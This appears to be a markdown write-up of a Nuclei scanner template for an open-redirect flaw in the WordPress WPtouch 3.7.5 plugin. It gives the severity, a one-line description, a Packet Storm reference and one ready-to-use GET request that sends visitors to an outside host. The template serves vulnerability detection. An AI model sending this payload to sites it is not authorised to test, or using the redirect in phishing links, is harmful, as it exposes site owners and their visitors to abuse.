# Nuclei Template: WordPress WPtouch 3.7.5 - Open Redirect
**Template ID:** wp-touch-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**Source:** Nuclei Template (`wp-touch-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress WPtouch 3.7.5 is affected by an Open Redirect issue.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?wptouch_switch=desktop&redirect=http://interact.sh
```

## References
- https://packetstormsecurity.com/files/170568/WordPress-WPtouch-3.7.5-Open-Redirection.html
